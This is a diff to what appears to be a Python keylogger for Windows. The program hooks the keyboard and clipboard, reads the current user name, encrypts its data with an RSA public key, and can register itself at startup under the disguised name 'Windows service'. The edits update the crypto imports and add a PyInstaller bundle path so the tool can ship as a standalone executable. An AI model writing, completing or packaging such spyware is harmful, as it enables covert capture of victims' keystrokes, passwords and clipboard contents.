@@ -5,15 +5,15 @@ from utils import *
 from constants import *
 import win32gui
 import win32clipboard
-from sys import argv
+import sys
 from getpass import getuser
 from os.path import realpath
 from os import environ
 from datetime import datetime
 from threading import Thread, Lock
 import ssl
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_OAEP
+from Cryptodome.PublicKey import RSA
+from Cryptodome.Cipher import PKCS1_OAEP
 import keyboard
 
 
@@ -157,7 +157,12 @@ if __name__ == "__main__":
         print(FILE_NAME)
     STARTUP = False
     STARTUP_NAME = "Windows service"
-    CERT_FILE = "cert.pem"
+
+    if getattr(sys, 'frozen', False):
+        CERT_FILE = sys._MEIPASS + "/cert.pem"
+    else:
+        CERT_FILE = "cert.pem"
+
     BANNED_BUTTONS = ["menu", "caps lock"]
 
     connected = False
@@ -165,7 +170,7 @@ if __name__ == "__main__":
     last_win = ""
 
     if STARTUP:
-        register_startup(STARTUP_NAME, realpath(argv[0]))
+        register_startup(STARTUP_NAME, realpath(sys.argv[0]))
 
     public_key = RSA.import_key(open(CERT_FILE).read())
     cipher_rsa = PKCS1_OAEP.new(public_key)
